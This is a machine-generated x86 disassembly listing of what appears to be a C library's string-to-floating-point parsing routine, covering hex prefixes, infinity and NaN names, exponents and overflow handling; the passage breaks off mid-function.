jb 0x8087200
xor esi, esi
mov ebx, eax
jmp 0x808701f
mov ecx, dword [var_6ch]
test ecx, ecx
jle 0x8087268
mov ebx, dword [var_6ch]
add ebx, 0x20
cmp ebx, 0x18
jg 0x8087225
mov dword [var_54h], 0
mov dword [var_6ch], ebx
mov esi, eax
xor ebx, ebx
jmp 0x808701f
mov dword [var_e0h], 0x18
mov edx, dword [var_6ch]
sub dword [var_e0h], edx
mov edx, dword [var_e0h]
test edx, edx
jle 0x8087219
mov ecx, dword [var_e0h]
lea esi, [var_54h]
mov dword [var_8h], 1
mov dword [var_4h], esi
mov dword [esp], esi
mov dword [var_ch], ecx
call fcn.0808c6f0
mov eax, dword [var_2ch]
jmp 0x8087219
mov ebx, dword [var_6ch]
sub ebx, 0x20
mov dword [var_58h], ebx
jmp 0x808721c
mov dword [var_d4h], 0
mov ebx, dword [var_2ch]
mov edi, dword [var_4ch]
xor eax, eax
mov edx, ebx
div edi
mov esi, eax
mov ebx, edx
mov eax, dword [var_6ch]
test eax, eax
jne 0x808731f
test esi, esi
mov edx, 0x20
je 0x80872a7
bsr edx, esi
xor edx, 0x1f
mov ecx, 0x20
sub dword [var_58h], edx
mov eax, ecx
sub eax, edx
cmp eax, 0x18
jle 0x808730f
add edx, 0x18
mov eax, esi
mov dword [var_fch], 0x39
sub ecx, edx
mov dword [var_d4h], edx
shr eax, cl
mov dword [var_54h], eax
mov edx, dword [var_fch]
cmp edx, 0x18
mov dword [var_6ch], edx
jle 0x8087283
mov edi, dword [var_c4h]
xor eax, eax
test edi, edi
jne 0x80872f2
test ebx, ebx
je 0x80872f7
mov eax, 1
mov dword [var_14h], eax
mov dword [var_ch], esi
mov eax, 0x1f
sub eax, dword [var_d4h]
jmp 0x8087113
neg edx
mov dword [var_54h], esi
add edx, 0x20
mov dword [var_fch], edx
jmp 0x80872d4
mov ecx, dword [var_6ch]
add ecx, 0x20
cmp ecx, 0x18
mov dword [var_fch], ecx
jg 0x8087335
mov dword [var_54h], esi
jmp 0x80872d4
mov dword [var_d4h], 0x18
mov eax, dword [var_6ch]
sub dword [var_d4h], eax
mov eax, dword [var_d4h]
test eax, eax
jle 0x80872d4
mov edx, dword [var_d4h]
lea ecx, [var_54h]
mov dword [var_8h], 1
mov dword [var_4h], ecx
mov dword [esp], ecx
mov dword [var_ch], edx
call fcn.0808c6f0
mov eax, esi
mov ecx, 0x20
sub ecx, dword [var_d4h]
shr eax, cl
or dword [var_54h], eax
jmp 0x80872d4
mov ecx, dword [var_68h]
lea edi, [var_4ch]
mov esi, eax
cld
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
jmp 0x8086b05
mov edx, dword [var_d0h]
mov ecx, dword [var_68h]
mov esi, dword [var_c8h]
mov dword [var_10h], ecx
mov ecx, dword [var_cch]
mov dword [var_ch], esi
mov eax, dword [edx + 4]
sub eax, 2
mov dword [var_8h], eax
mov eax, dword [edx]
mov dword [esp], ecx
lea eax, [eax*4 + 0x80a6248]
mov dword [var_4h], eax
call fcn.0808c7c0
mov edi, dword [var_c8h]
mov esi, dword [var_d0h]
mov edx, dword [var_68h]
add edx, dword [esi + 4]
mov esi, dword [var_cch]
mov dword [var_cch], edi
mov dword [var_c8h], esi
lea ecx, [edx - 2]
sub edx, 3
test eax, eax
cmovne edx, ecx
mov dword [var_68h], edx
jmp 0x8086ae3
mov eax, dword [var_6ch]
mov edx, dword [var_6ch]
add eax, 0x1e
dec edx
cmovns eax, edx
mov dword [var_bch], edx
and eax, 0xffffffe0
sub edx, eax
cmp edx, 0x17
je 0x80874f0
cmp edx, 0x16
jg 0x80874aa
mov eax, 0x17
mov ebx, 1
lea ecx, [var_2ch]
sub eax, edx
mov dword [var_8h], esi
mov dword [var_4h], ecx
mov dword [var_ch], eax
mov eax, ebx
sub eax, esi
lea eax, [ebp + eax*4 - 0x54]
mov dword [esp], eax
call fcn.0808c6f0
mov eax, ebx
sub eax, dword [var_5ch]
test eax, eax
jle 0x808747c
lea edx, [var_54h]
mov dword [edx], 0
add edx, 4
dec eax
jne 0x8087470
mov edx, dword [var_60h]
mov ecx, dword [var_bch]
mov dword [var_14h], 0
mov dword [var_10h], 0
mov dword [var_ch], 0
mov dword [var_8h], edx
mov dword [var_4h], ecx
jmp 0x808697d
lea eax, [edx - 0x17]
lea edi, [var_54h]
mov dword [var_8h], esi
mov dword [var_ch], eax
lea eax, [var_2ch]
mov dword [var_4h], eax
mov eax, 1
sub eax, esi
lea eax, [edi + eax*4]
mov dword [esp], eax
call fcn.0808c750
mov edx, dword [var_5ch]
neg edx
test edx, edx
mov dword [ebp + edx*4 - 0x54], eax
jle 0x808747c
mov ecx, edi
mov eax, edx
mov dword [ecx], 0
add ecx, 4
dec eax
jne 0x80874e2
jmp 0x808747c
mov eax, 1
lea ecx, [esi*4]
mov edi, eax
shr ecx, 2
sub edi, esi
lea esi, [var_2ch]
lea edi, [ebp + edi*4 - 0x54]
cld
rep movsd dword es:[edi], dword ptr [esi]
sub eax, dword [var_5ch]
test eax, eax
jle 0x808747c
lea edx, [var_54h]
mov dword [edx], 0
add edx, 4
dec eax
jne 0x808751b
jmp 0x808747c
mov ecx, dword [var_5ch]
lea edi, [var_2ch]
mov esi, eax
cld
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
jmp 0x808689f
mov dword [var_10h], edx
mov ecx, dword [var_a0h]
mov dword [var_8h], esi
mov edx, dword [var_a8h]
mov dword [var_ch], ecx
mov ecx, dword [var_a4h]
mov eax, dword [edx]
mov dword [esp], ecx
lea eax, [eax*4 + 0x80a6248]
jmp 0x8086849
call fcn.08048b20
mov dword [eax], 0x22
jmp 0x80864a6
mov ecx, dword [var_80h]
mov eax, ebx
neg ecx
cmp ebx, ecx
jge 0x8086765
mov eax, ecx
jmp 0x8086765
mov eax, dword [var_70h]
mov ecx, dword [arg_14h]
mov dword [var_9ch], 0
mov esi, 0x17
movzx edx, byte [eax]
mov edi, dword [ecx + 0x34]
movsx eax, dl
test byte [edi + eax*2 + 1], 0x10
jne 0x80875cf
inc dword [var_70h]
mov eax, dword [var_70h]
movzx edx, byte [eax]
movsx eax, dl
test byte [edi + eax*2 + 1], 0x10
je 0x80875bc
cmp dl, 0x30
je 0x808774b
movsx edx, dl
lea eax, [edx - 0x30]
cmp eax, 9
ja 0x8087737
inc dword [var_70h]
mov edx, eax
mov eax, dword [edx*4 + 0x80a60c0]
dec dword [var_7ch]
mov dword [var_6ch], eax
mov eax, esi
sub eax, dword [var_6ch]
lea ecx, [eax + 1]
mov esi, eax
shl edx, cl
mov ecx, dword [var_6ch]
mov dword [var_54h], edx
mov edx, dword [var_80h]
lea eax, [ecx + edx*4]
add eax, dword [var_58h]
lea ebx, [eax - 5]
mov eax, dword [var_7ch]
mov dword [var_58h], ebx
test eax, eax
jle 0x8087683
mov eax, dword [var_9ch]
lea ebx, [ebp + eax*4 - 0x54]
mov ecx, dword [var_70h]
movzx edx, byte [ecx]
movsx eax, dl
test byte [edi + eax*2 + 1], 0x10
jne 0x8087649
mov eax, dword [var_94h]
add ecx, eax
mov dword [var_70h], ecx
movzx edx, byte [ecx]
movsx edx, dl
lea eax, [edx - 0x30]
cmp eax, 9
ja 0x8087723
inc dword [var_70h]
mov edx, eax
lea eax, [esi + 1]
cmp eax, 3
jle 0x80876d3
lea ecx, [esi - 3]
sub esi, 4
shl edx, cl
or dword [ebx], edx
dec dword [var_7ch]
mov eax, dword [var_7ch]
test eax, eax
jle 0x8087683
mov eax, dword [var_9ch]
test eax, eax
jns 0x808762b
mov edi, dword [var_9ch]
test edi, edi
jle 0x80876a2
lea edx, [var_54h]
mov eax, dword [var_9ch]
mov dword [edx], 0
add edx, 4
dec eax
jne 0x8087696
mov eax, dword [var_58h]
mov esi, dword [var_60h]
mov dword [var_14h], 0
mov dword [var_10h], 0
mov dword [var_ch], 0
mov dword [var_4h], eax
mov dword [var_8h], esi
lea eax, [var_54h]
mov dword [esp], eax
jmp 0x8086983
mov ecx, 3
mov eax, edx
sub ebx, 4
sub ecx, esi
shr eax, cl
lea ecx, [esi + 0x1d]
or dword [ebx + 4], eax
shl edx, cl
dec dword [var_9ch]
js 0x80876fb
mov dword [ebx], edx
add esi, 0x1c
jmp 0x808766f
xor eax, eax
mov ecx, dword [var_60h]
mov dword [var_10h], 0x1f
cmp dword [var_7ch], 0
mov dword [var_ch], edx
setg al
mov dword [var_8h], ecx
mov dword [var_14h], eax
mov eax, dword [var_58h]
jmp 0x8086979
mov ecx, dword [arg_14h]
inc dword [var_70h]
mov eax, dword [ecx + 0x38]
mov edx, dword [eax + edx*4]
sub edx, 0x57
jmp 0x808765d
mov ecx, dword [arg_14h]
inc dword [var_70h]
mov eax, dword [ecx + 0x38]
mov edx, dword [eax + edx*4]
sub edx, 0x57
jmp 0x80875ec
inc dword [var_70h]
mov ecx, dword [var_70h]
movzx edx, byte [ecx]
cmp dl, 0x30
je 0x808774b
jmp 0x80875d8
mov eax, dword [var_84h]
mov edx, dword [var_58h]
shl eax, 2
sub edx, eax
jmp 0x8086737
test al, al
jne 0x80866de
jmp 0x8086715
mov esi, esi
mov ecx, dword [var_88h]
movzx eax, byte [ecx + 1]
jmp 0x8087771
mov esi, dword [arg_ch]
test esi, esi
jne 0x80864a1
jmp 0x80864a6
mov edi, dword [arg_ch]
test edi, edi
je 0x80864a6
mov eax, dword [arg_8h]
mov esi, dword [arg_ch]
mov dword [esi], eax
jmp 0x80864a6
mov eax, dword [var_88h]
movzx eax, byte [eax]
mov byte [var_fdh], al
mov edx, dword [var_7ch]
xor eax, eax
test edx, edx
mov dword [var_80h], edx
setne al
xor ebx, ebx
dec eax
cmp byte [var_fdh], 0
mov dword [var_84h], eax
je 0x8087aca
mov ecx, dword [var_88h]
movzx eax, byte [ecx]
cmp al, byte [ebx + edi]
jne 0x8087803
mov edx, dword [var_88h]
inc ebx
movzx eax, byte [ebx + edx]
test al, al
jne 0x80877ef
test al, al
jne 0x8087ac3
add edi, dword [var_94h]
movzx esi, byte [edi]
lea eax, [esi - 0x30]
cmp al, 9
ja 0x8087a88
mov eax, dword [arg_14h]
mov ecx, dword [eax + 0x38]
mov edx, esi
cmp dl, 0x30
je 0x8087846
mov eax, dword [var_7ch]
sub eax, dword [var_80h]
cmp dword [var_84h], 0xffffffff
cmovne eax, dword [var_84h]
mov dword [var_84h], eax
inc dword [var_7ch]
inc edi
movzx esi, byte [edi]
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x8087825
cmp dword [var_64h], 0x10
mov edx, esi
movsx eax, dl
jne 0x808786c
mov edx, dword [ecx + eax*4]
cmp edx, 0x60
jle 0x808786c
cmp edx, 0x66
jle 0x8087825
cmp dword [var_64h], 0x10
mov dword [var_78h], edi
je 0x8087a7f
cmp dword [ecx + eax*4], 0x65
je 0x8087932
mov esi, dword [var_80h]
cmp dword [var_7ch], esi
jle 0x8087898
mov eax, dword [var_78h]
cmp byte [eax - 1], 0x30
je 0x808791e
mov ecx, dword [var_80h]
cmp dword [var_7ch], ecx
jne 0x8086680
mov eax, dword [var_7ch]
test eax, eax
jle 0x8086680
mov ebx, dword [var_58h]
test ebx, ebx
jns 0x8086680
cmp dword [var_64h], 0x10
je 0x8087905
mov eax, dword [var_78h]
movzx ecx, byte [eax - 1]
movsx eax, cl
sub eax, 0x30
cmp eax, 9
ja 0x8087900
cmp cl, 0x30
jne 0x8086680
dec dword [var_7ch]
inc ebx
dec dword [var_78h]
mov esi, dword [var_7ch]
dec dword [var_80h]
mov dword [var_58h], ebx
test esi, esi
jle 0x8086680
test ebx, ebx
js 0x80878ba
jmp 0x8086680
lea esi, [esi]
dec dword [var_78h]
jmp 0x80878ba
mov esi, dword [var_78h]
movzx ecx, byte [esi - 1]
mov esi, dword [arg_14h]
mov eax, dword [esi + 0x34]
movsx edx, cl
test byte [eax + edx*2 + 1], 0x10
jne 0x80878d2
jmp 0x8087900
dec dword [var_78h]
dec dword [var_7ch]
mov edx, dword [var_78h]
cmp byte [edx - 1], 0x30
je 0x808791e
jmp 0x8087898
inc edi
mov dword [var_98h], 0
movzx esi, byte [edi]
mov eax, esi
cmp al, 0x2d
je 0x8087a73
cmp al, 0x2b
je 0x8087a6a
lea eax, [esi - 0x30]
cmp al, 9
ja 0x8087a62
cmp dword [var_64h], 0x10
je 0x8087a32
mov edx, dword [var_98h]
test edx, edx
je 0x8087a21
mov edx, dword [var_80h]
add edx, 0x3d
mov eax, dword [var_58h]
lea eax, [eax + eax*4]
lea ebx, [eax + eax]
cmp ebx, edx
mov dword [var_58h], ebx
jg 0x80879ba
mov ecx, esi
inc edi
movsx eax, cl
lea ebx, [eax + ebx - 0x30]
mov dword [var_58h], ebx
movzx esi, byte [edi]
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x808797b
mov eax, dword [var_98h]
test eax, eax
je 0x8087883
neg ebx
mov dword [var_58h], ebx
jmp 0x8087883
cmp dword [var_84h], 0xffffffff
je 0x8087a0e
call fcn.08048b20
mov dword [eax], 0x22
mov eax, dword [var_98h]
test eax, eax
jne 0x8087a07
mov eax, dword [var_60h]
mov edx, 0x7f800000
test eax, eax
cmovne edx, dword [0x80a6100]
inc edi
movzx eax, byte [edi]
sub eax, 0x30
cmp al, 9
jbe 0x80879e9
mov eax, dword [arg_ch]
test eax, eax
je 0x8087a00
mov ecx, dword [arg_ch]
mov dword [ecx], edi
mov eax, edx
jmp 0x80863f6
mov edx, 0
jmp 0x80879e9
mov eax, dword [var_60h]
mov edx, 0
test eax, eax
cmovne edx, dword [0x80a6104]
jmp 0x80879e9
mov eax, dword [var_84h]
sub eax, dword [var_80h]
lea edx, [eax + 0x26]
jmp 0x808797b
mov ebx, dword [var_98h]
mov ecx, dword [var_80h]
test ebx, ebx
lea edx, [ecx*4 + 0x95]
jne 0x808797b
mov edx, dword [var_84h]
mov eax, ecx
shl eax, 2
sub edx, eax
lea edx, [edx + 0x80]
jmp 0x808797b
mov edi, dword [var_78h]
jmp 0x8087883
inc edi
movzx esi, byte [edi]
jmp 0x8087952
mov dword [var_98h], 1
jmp 0x8087a6a
cmp dword [ecx + eax*4], 0x70
jmp 0x808787d
cmp dword [var_64h], 0x10
je 0x8087a9e
mov ecx, esi
movsx eax, cl
mov esi, dword [arg_14h]
mov ecx, dword [esi + 0x38]
jmp 0x808786c
mov edx, esi
movsx eax, dl
mov edx, dword [arg_14h]
mov ecx, dword [edx + 0x38]
mov edx, dword [ecx + eax*4]
cmp edx, 0x60
jle 0x808786c
cmp edx, 0x66
jle 0x8087825
jmp 0x808786c
mov edx, esi
movsx eax, dl
jmp 0x8087a93
mov ecx, dword [var_88h]
movzx eax, byte [ecx]
jmp 0x8087803
mov ecx, dword [var_8ch]
movzx eax, byte [ecx]
jmp 0x80865ec
mov edx, dword [arg_14h]
mov ecx, esi
movsx eax, cl
mov ecx, dword [edx + 0x38]
mov eax, dword [ecx + eax*4]
cmp eax, 0x60
jbe 0x80865b5
cmp eax, 0x66
ja 0x80865b5
inc dword [var_7ch]
jmp 0x80865e6
mov eax, dword [arg_14h]
mov edx, esi
mov ecx, dword [eax + 0x38]
cmp dl, byte [ecx + 0x184]
jl 0x8087b2a
cmp dl, byte [ecx + 0x198]
jle 0x8086595
xor ebx, ebx
cmp byte [var_edh], 0
je 0x8086595
mov ecx, dword [var_88h]
movzx eax, byte [ecx]
cmp al, byte [ebx + edi]
jne 0x8086595
mov edx, dword [var_88h]
inc ebx
movzx eax, byte [ebx + edx]
test al, al
jne 0x8087b42
jmp 0x8086595
mov ecx, dword [var_8ch]
movzx eax, byte [ecx]
jmp 0x8086580
mov ecx, esi
cmp cl, 0x30
jne 0x8086584
inc edi
movzx esi, byte [edi]
mov eax, esi
cmp al, 0x30
je 0x8087b78
jmp 0x8086584
mov edx, dword [arg_14h]
movsx eax, byte [edi + 1]
mov ecx, dword [edx + 0x38]
cmp dword [ecx + eax*4], 0x78
jne 0x808652e
add edi, 2
mov dword [var_64h], 0x10
movzx esi, byte [edi]
mov dword [var_90h], 0
jmp 0x808652e
test al, al
jne 0x8086388
jmp 0x8086378
mov edx, dword [var_88h]
movzx eax, byte [edx]
jmp 0x8087bb7
inc edi
movzx esi, byte [edi]
jmp 0x8086338
mov dword [var_60h], 1
jmp 0x8087bcf
push ebp
mov eax, 0
mov ebp, esp
sub esp, 0x10
test eax, eax
je 0x8085d80
mov dword [esp], 3
call section.
mov dword [var_ch], eax
mov eax, dword [arg_10h]
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.0808a440
leave
ret
lea esi, [esi]
mov eax, dword [0x80a9ab4]
jmp 0x8085d5b
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x1138
mov ecx, dword [arg_10h]
mov eax, dword [arg_14h]
mov dword [var_1078h], 0xa
mov dword [var_10a0h], 0
test ecx, ecx
mov edx, dword [eax + 4]
je 0x808a499
mov ecx, dword [edx + 0x2c]
mov dword [var_10a4h], ecx
movzx eax, byte [ecx]
test al, al
jle 0x808a499
cmp al, 0x7f
je 0x808a499
mov esi, dword [edx + 0x28]
mov dword [var_10a0h], esi
cmp byte [esi], 0
jne 0x808a4a3
mov dword [var_10a0h], 0
mov dword [var_10a4h], 0
mov edx, dword [edx + 0x24]
mov dword [var_109ch], edx
mov dword [esp], edx
call fcn.08053400
mov edi, dword [arg_8h]
mov dword [var_1080h], 0
mov dword [var_10a8h], eax
mov dword [var_106ch], 0
mov dword [var_1074h], 0
mov eax, dword [arg_14h]
dec edi
mov edx, dword [eax + 0x34]
inc edi
movzx esi, byte [edi]
mov ecx, esi
movsx eax, cl
test byte [edx + eax*2 + 1], 0x20
jne 0x808a4e2
cmp cl, 0x2d
je 0x808c261
cmp cl, 0x2b
je 0x808c258
mov edx, dword [var_109ch]
xor ebx, ebx
movzx edx, byte [edx]
test dl, dl
mov byte [var_1112h], dl
mov byte [var_1111h], dl
je 0x808c24d
mov eax, edx
cmp byte [ebx + edi], al
jne 0x808c240
mov ecx, dword [var_109ch]
inc ebx
movzx eax, byte [ebx + ecx]
test al, al
jne 0x808a525
movzx eax, byte [ebx + edi]
cmp al, 0x2f
jle 0x808a54d
cmp al, 0x39
jle 0x808a727
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x808a727
mov ecx, esi
mov esi, dword [arg_14h]
movsx eax, cl
mov ebx, eax
mov ecx, dword [esi + 0x38]
cmp dword [ecx + eax*4], 0x69
je 0x808a6a9
cmp dword [ecx + ebx*4], 0x6e
jne 0x808a693
mov ecx, dword [arg_14h]
mov dword [var_8h], 3
mov dword [var_4h], 0x80a0fb8
mov dword [esp], edi
mov dword [var_ch], ecx
call fcn.0808dd40
test eax, eax
jne 0x808a693
fld dword [0x80a61a4]
add edi, 3
fstp xword [ebp - 0x10b4]
cmp byte [edi], 0x28
je 0x808a5d1
mov eax, dword [arg_ch]
test eax, eax
je 0x808a5c0
mov eax, dword [arg_ch]
mov dword [eax], edi
fld xword [ebp - 0x10b4]
add esp, 0x1138
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [arg_14h]
mov ebx, edi
mov ecx, dword [eax + 0x38]
inc edi
movzx edx, byte [edi]
lea eax, [edx - 0x30]
cmp al, 9
jbe 0x808a5d9
movsx eax, dl
mov eax, dword [ecx + eax*4]
cmp eax, 0x60
jle 0x808a5f4
cmp eax, 0x7a
jle 0x808a5d9
cmp dl, 0x5f
je 0x808a5d9
cmp dl, 0x29
je 0x808a602
mov edi, ebx
jmp 0x808a5b4
mov edx, dword [arg_14h]
lea eax, [var_1060h]
mov dword [var_ch], 0
mov dword [var_4h], eax
mov dword [var_8h], 0
lea eax, [ebx + 1]
mov dword [esp], eax
mov dword [var_10h], edx
call fcn.080856c0
cmp dword [var_1060h], edi
mov ecx, eax
mov ebx, edx
jne 0x808a5b4
and edx, 0x7fffffff
mov dword [var_105ch], 0
mov dword [var_1058h], 0xc0000000
mov esi, edx
mov dword [var_1054h], 0x7fff
or esi, eax
jne 0x808a66f
xor ecx, ecx
mov ebx, 0x40000000
mov eax, ebx
mov dword [var_105ch], ecx
or eax, 0x80000000
mov dword [var_1058h], eax
fld xword [ebp - 0x105c]
fstp xword [ebp - 0x10b4]
jmp 0x808a5b4
mov eax, dword [arg_ch]
test eax, eax
je 0x808a6a2
mov ecx, dword [arg_8h]
mov edx, dword [arg_ch]
mov dword [edx], ecx
fldz
jmp 0x808a5c6
mov dword [var_ch], esi
mov dword [var_8h], 3
mov dword [var_4h], 0x80a0fc0
mov dword [esp], edi
call fcn.0808dd40
test eax, eax
jne 0x808a71c
mov eax, dword [arg_ch]
test eax, eax
je 0x808a6fc
lea ebx, [edi + 3]
mov dword [var_ch], esi
mov dword [var_8h], 5
mov dword [esp], ebx
mov dword [var_4h], str.inity
call fcn.0808dd40
test eax, eax
lea edx, [edi + 8]
mov eax, dword [arg_ch]
cmove ebx, edx
mov dword [eax], ebx
mov edx, dword [var_1074h]
test edx, edx
je 0x808a711
fld dword [0x80a6100]
jmp 0x808a5c6
fld dword [0x80a61a0]
jmp 0x808a5c6
mov edx, dword [arg_14h]
mov ecx, dword [edx + 0x38]
jmp 0x808a56f
mov eax, esi
cmp al, 0x30
je 0x808c207
mov eax, dword [var_10a0h]
mov dword [var_1088h], edi
test eax, eax
je 0x808c1ed
mov ecx, dword [var_10a0h]
movzx edx, byte [ecx]
mov esi, esi
mov eax, esi
cmp al, 0x30
je 0x808a785
xor ebx, ebx
test dl, dl
je 0x808c1df
mov ecx, dword [var_10a0h]
movzx eax, byte [ecx]
lea esi, [esi]
mov ecx, esi
cmp cl, al
jne 0x808a78b
mov ecx, dword [var_10a0h]
inc ebx
movzx eax, byte [ebx + ecx]
test al, al
jne 0x808a770
inc edi
movzx esi, byte [edi]
jmp 0x808a750
test al, al
je 0x808a785
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x808a7a3
cmp dword [var_1078h], 0x10
je 0x808c18e
mov dword [var_1084h], edi
mov dword [var_1090h], 0
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x808c183
cmp dword [var_1078h], 0x10
je 0x808c163
mov eax, dword [var_10a0h]
test eax, eax
je 0x808a80a
mov ecx, dword [var_10a0h]
xor ebx, ebx
movzx eax, byte [ecx]
test al, al
je 0x808c155
cmp al, byte [ebx + edi]
jne 0x808a806
mov edx, dword [var_10a0h]
inc ebx
movzx eax, byte [ebx + edx]
test al, al
jne 0x808a7e8
lea esi, [esi]
inc edi
movzx esi, byte [edi]
jmp 0x808a7b3
test al, al
je 0x808a800
mov eax, dword [var_10a4h]
test eax, eax
je 0x808bdc3
mov ebx, dword [var_1090h]
test ebx, ebx
jle 0x808bdc3
mov ecx, dword [var_1088h]
mov eax, dword [var_10a4h]
mov dword [var_4h], edi
mov edx, dword [var_10a0h]
mov dword [esp], ecx
mov dword [var_ch], eax
mov dword [var_8h], edx
call fcn.08049980
cmp edi, eax
mov ecx, eax
je 0x808bdb4
cmp eax, dword [var_1088h]
je 0x808bd9c
cmp eax, dword [var_1084h]
jb 0x808bd8c
mov ecx, dword [var_1084h]
mov edi, eax
mov dword [var_1090h], 0
cmp ecx, eax
jae 0x808a8a5
movzx eax, byte [ecx]
mov edx, dword [var_1090h]
inc edx
sub eax, 0x30
cmp al, 9
cmova edx, dword [var_1090h]
inc ecx
cmp ecx, edi
mov dword [var_1090h], edx
jb 0x808a884
mov ecx, dword [var_1090h]
mov dword [var_1098h], 0
mov dword [var_1094h], ecx
mov edx, dword [arg_ch]
test edx, edx
je 0x808a8c7
mov edx, dword [arg_ch]
mov dword [edx], edi
mov eax, dword [var_1090h]
test eax, eax
jne 0x808a8ea
mov eax, dword [var_1074h]
test eax, eax
je 0x808a6a2
fld dword [0x80a6104]
jmp 0x808a5c6
mov eax, dword [var_1098h]
test eax, eax
je 0x808a99c
mov ecx, dword [var_109ch]
mov esi, dword [var_109ch]
movzx ecx, byte [ecx]
mov byte [var_1112h], cl
movzx edx, byte [esi + 1]
mov ecx, dword [var_1084h]
movzx eax, byte [var_1112h]
cmp byte [ecx], al
je 0x808a92a
inc dword [var_1084h]
jmp 0x808a911
test dl, dl
mov ebx, 1
je 0x808bd80
mov esi, dword [var_109ch]
movzx eax, byte [esi + 1]
mov ecx, dword [var_1084h]
cmp al, byte [ebx + ecx]
jne 0x808bd70
mov esi, dword [var_109ch]
inc ebx
movzx eax, byte [ebx + esi]
test al, al
jne 0x808a941
mov eax, dword [var_1098h]
add eax, dword [var_10a8h]
add dword [var_1084h], eax
cmp dword [var_1078h], 0x10
je 0x808bd5a
mov edx, dword [var_106ch]
sub edx, dword [var_1098h]
mov esi, dword [var_1098h]
mov dword [var_106ch], edx
sub dword [var_1090h], esi
cmp dword [var_1078h], 0x10
je 0x808bb42
mov ebx, dword [var_106ch]
test ebx, ebx
mov edx, ebx
js 0x808bb29
mov eax, dword [var_1090h]
sub eax, dword [var_1094h]
cmp ebx, eax
cmovle eax, ebx
add dword [var_1094h], eax
mov ebx, edx
sub ebx, eax
mov eax, dword [var_1094h]
mov dword [var_106ch], ebx
add eax, ebx
cmp eax, 0x1345
jg 0x808ab74
cmp ebx, 0xffffecaa
jl 0x808bb19
mov ecx, dword [var_1094h]
test ecx, ecx
jle 0x808ad3c
mov esi, dword [var_109ch]
mov edx, dword [var_10a0h]
lea eax, [var_106ch]
mov ecx, dword [var_10a8h]
mov dword [var_10h], eax
mov eax, dword [var_1084h]
mov dword [var_14h], esi
mov dword [var_1ch], edx
mov esi, dword [var_1094h]
mov dword [var_18h], ecx
lea edx, [var_1070h]
mov dword [esp], eax
lea ecx, [var_82ch]
mov dword [var_ch], edx
mov dword [var_8h], ecx
mov dword [var_4h], esi
call fcn.0808a220
mov ebx, dword [var_106ch]
mov dword [var_1084h], eax
test ebx, ebx
jle 0x808ab49
lea edx, [var_82ch]
lea ecx, [var_104ch]
mov edi, 1
mov dword [var_10c0h], edx
mov dword [var_10c4h], ecx
mov dword [var_10c8h], 0x80a7020
test edi, ebx
je 0x808ab26
mov eax, dword [var_10c8h]
mov edx, dword [var_1070h]
xor ebx, edi
mov dword [var_106ch], ebx
mov esi, dword [eax + 4]
sub esi, 2
cmp edx, esi
jl 0x808baea
mov dword [var_10h], esi
mov eax, dword [eax]
mov dword [var_8h], edx
mov edx, dword [var_10c4h]
lea eax, [eax*4 + 0x80a6248]
mov dword [var_ch], eax
mov dword [esp], edx
mov eax, dword [var_10c0h]
mov dword [var_4h], eax
call fcn.0808c7c0
mov edx, eax
mov eax, dword [var_1070h]
add eax, esi
test edx, edx
mov dword [var_1070h], eax
jne 0x808ab08
dec eax
mov dword [var_1070h], eax
mov eax, dword [var_10c0h]
mov esi, dword [var_10c4h]
mov ebx, dword [var_106ch]
mov dword [var_10c0h], esi
mov dword [var_10c4h], eax
add edi, edi
add dword [var_10c8h], 0x10
test ebx, ebx
jne 0x808aa96
lea eax, [var_104ch]
cmp dword [var_10c0h], eax
je 0x808bace
mov edx, dword [var_1070h]
bsr ecx, dword [ebp + edx*4 - 0x830]
xor ecx, 0x1f
mov eax, edx
mov dword [var_10cch], edx
shl eax, 5
sub eax, ecx
cmp eax, 0x4000
mov dword [var_1080h], eax
jle 0x808ab84
call fcn.08048b20
mov dword [eax], 0x22
jmp 0x808a6fc
cmp dword [var_1080h], 0x40
jle 0x808ad00
mov edx, dword [var_1080h]
mov eax, dword [var_1080h]
mov dword [var_10d4h], 0x1f
sub edx, 0x21
sub eax, 0x40
mov esi, eax
mov edi, eax
cmovs esi, edx
sar esi, 5
mov edx, esi
lea ecx, [esi - 1]
shl edx, 5
sub edi, edx
cmovne ecx, esi
lea eax, [edi - 1]
test edi, edi
cmove eax, dword [var_10d4h]
mov dword [var_10d0h], ecx
mov dword [var_10d4h], eax
jne 0x808ac78
mov eax, dword [ebp + esi*4 - 0x82c]
mov dword [var_1068h], eax
mov eax, dword [ebp + esi*4 - 0x828]
mov dword [var_1064h], eax
mov eax, dword [var_82ch]
xor ebx, ebx
test eax, eax
jne 0x808ac14
inc ebx
mov eax, dword [ebp + ebx*4 - 0x82c]
test eax, eax
je 0x808ac08
xor eax, eax
mov esi, dword [var_1090h]
cmp dword [var_1094h], esi
jl 0x808ac2c
cmp ebx, dword [var_10d0h]
jge 0x808ac31
mov eax, 1
mov dword [var_14h], eax
mov edx, dword [var_10d0h]
mov ecx, dword [var_1074h]
mov eax, dword [var_10d4h]
mov dword [var_8h], ecx
mov dword [var_10h], eax
mov eax, dword [ebp + edx*4 - 0x82c]
mov dword [var_ch], eax
mov eax, dword [var_1080h]
dec eax
lea esi, [var_1068h]
mov dword [var_4h], eax
mov dword [esp], esi
call fcn.08089f80
jmp 0x808a5c6
mov eax, dword [var_10cch]
mov ebx, esi
dec eax
cmp esi, eax
jge 0x808acde
mov dword [var_10d8h], eax
mov dword [var_10dch], 0x20
lea eax, [var_1068h]
sub dword [var_10dch], edi
mov dword [var_1124h], eax
mov edx, dword [ebp + ebx*4 - 0x82c]
mov ecx, edi
mov eax, dword [ebp + ebx*4 - 0x828]
inc ebx
shr edx, cl
movzx ecx, byte [var_10dch]
shl eax, cl
or edx, eax
mov eax, dword [var_1124h]
mov dword [eax], edx
add eax, 4
cmp ebx, dword [var_10d8h]
mov dword [var_1124h], eax
jl 0x808aca7
mov eax, ebx
sub eax, esi
dec eax
jg 0x808abfc
mov eax, dword [ebp + ebx*4 - 0x82c]
mov ecx, edi
shr eax, cl
jmp 0x808abf6
lea esi, [esi]
mov eax, dword [var_1094h]
cmp dword [var_1090h], eax
je 0x808b95b
mov ecx, dword [var_10cch]
lea esi, [var_82ch]
lea edi, [var_1068h]
